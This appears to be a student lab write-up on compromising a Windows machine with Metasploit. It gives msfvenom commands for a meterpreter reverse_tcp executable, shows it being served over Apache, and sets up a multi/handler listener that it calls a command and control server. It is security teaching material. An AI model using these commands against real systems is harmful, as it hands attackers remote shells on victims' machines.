# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="1920" height="909" alt="con1" src="https://github.com/user-attachments/assets/6c51bfc6-146a-4852-bb20-6b08c092b2c3" />

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="723" height="133" alt="image" src="https://github.com/user-attachments/assets/6902cdda-455a-4df9-9f4d-846969dfe402" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="595" height="106" alt="image" src="https://github.com/user-attachments/assets/af49f7b4-94b3-4b2b-b93c-7258431d4986" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="703" height="94" alt="image" src="https://github.com/user-attachments/assets/3e5715cf-e560-42e1-a8bf-7de3a45c5555" />


Invoke msfconsole:
## OUTPUT:

<img width="837" height="654" alt="image" src="https://github.com/user-attachments/assets/30ad4265-e0cf-441e-a6a7-d2e0ae55182d" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="700" height="772" alt="image" src="https://github.com/user-attachments/assets/e075221e-5f27-45fb-ab8a-bc87d92aa9fc" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 


## OUTPUT:

<img width="810" height="192" alt="image" src="https://github.com/user-attachments/assets/a41b73d7-7124-453c-b8e3-8a26d49440b5" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
